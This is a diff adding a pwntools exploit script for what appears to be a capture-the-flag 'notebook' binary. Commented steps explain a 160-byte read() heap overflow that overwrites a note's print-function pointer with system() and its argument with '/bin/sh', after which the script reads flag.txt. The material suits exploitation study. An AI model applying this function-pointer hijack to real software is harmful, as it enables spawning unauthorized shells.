@@ -1,0 +1,109 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from time import sleep
+
+SIMPLE = 1
+PRINTABLE = 2
+
+exe = context.binary = ELF("./notebook", checksec=False)
+context.log_level = "error"
+
+
+def start(argv=[], *a, **kw):
+    gdbscript = """
+    tbreak main
+    continue
+    """.format(
+        **locals()
+    )
+
+    if args.GDB:
+        context.log_level = "debug"
+        context.terminal = ["tmux", "split", "-h"]
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+# you can also create new functions here
+
+def wait_main_menu(io):
+    io.recvuntil(b"7) Exit\n")
+
+def create_note(io, content, type, printer_type=1):
+    # printer_type1 = puts, printer_type2 = printf
+    wait_main_menu(io)
+    io.sendline(bytes(str(type), "ASCII"))
+    io.recvuntil(b"note with max 60 characters:\n")
+    io.sendline(content)
+    if type == 2:
+        io.recvuntil(b"Do you want to have puts from libc as printing function?:\n")
+        io.sendline(bytes(str(printer_type), "ASCII"))
+
+def change_note(io, new_content, type, index):
+    wait_main_menu(io)
+    io.sendline(bytes(str(type+2), "ASCII"))
+    io.recvuntil(b"note you want to change:\n")
+    io.sendline(bytes(str(index), "ASCII"))
+    io.recvuntil(b"Enter new text:\n")
+    io.sendline(new_content)
+
+def show_note(io, type, index):
+    wait_main_menu(io)
+    io.sendline(bytes(str(type+4), "ASCII"))
+    io.recvuntil(b"note you want to show:\n")
+    io.sendline(bytes(str(index), "ASCII"))
+
+def exit_notebook(io):
+    wait_main_menu(io)
+    io.sendline(bytes("7", "ASCII"))
+
+
+def main():
+    io = start()
+
+    # A bug can be found within change_simple_note():
+    # read() is used with a count argument of 0xa0 (=160), which makes
+    # an overflow possible
+
+    # After creating a simple note "qwer" and a printable note "ABCD", 
+    # the heap looks as follows:
+    #
+    # 0x5555555596a0:	0x00000000	0x00000000	0x00000051	0x00000000
+    # 0x5555555596b0:	0x72657771	0x0000000a	0x00000000	0x00000000  <-- beginning of simple note text
+    # 0x5555555596c0:	0x00000000	0x00000000	0x00000000	0x00000000
+    # 0x5555555596d0:	0x00000000	0x00000000	0x00000000	0x00000000
+    # 0x5555555596e0:	0x00000000	0x00000000	0x00000000	0x00000000
+    # 0x5555555596f0:	0x00000000	0x00000000	0x00000051	0x00000000
+    # 0x555555559700:	0x44434241	0x00000000	0x00000000	0x00000000  <-- beginning of printable note text
+    # 0x555555559710:	0x00000000	0x00000000	0x00000000	0x00000000
+    # 0x555555559720:	0x00000000	0x00000000	0x00000000	0x00000000
+    # 0x555555559730:	0x00000000	0x00000000	0x00000000	0x00000000
+    # 0x555555559740:	0xf7e405a0	0x00007fff                          <-- address of selected print function
+
+    # From looking at the disassembly, we know that choosing option 6 (show printable note)
+    # will execute the function located at the given address (here 0x7ffff7e405a0 = puts)
+    # with the text of that printable note as its argument.
+
+    # Given that we can overflow from the previous chunk (our simple note) into the one belonging
+    # to our printable note, we can attempt to to override
+    #   1) the function (address) getting called when running "show printable note"
+    #      e.g. --> 0x7ffff7e0e410 = system
+    #   2) the argument provided for that function
+    #      e.g. --> "/bin/sh\n"
+
+    create_note(io, b"Hello there", SIMPLE)             # creates simple note (0)
+    create_note(io, b"General Kenobi", PRINTABLE, 1)    # creates printable note (0)
+    
+    system_address = str(bin(int("7ffff7e0e410", base=16)))[2:]
+    exploit_string = b"A"*(4*20) + b"/bin/sh\n" + b"A"*(4*14) + b"\x10\xe4\xe0\xf7\xff\x7f"
+    
+    change_note(io, exploit_string, SIMPLE, 0)
+    show_note(io, PRINTABLE, 0)
+    
+    io.sendline(b"cat flag.txt")
+    io.sendline(b"exit")
+
+
+if __name__ == "__main__":
+    main()
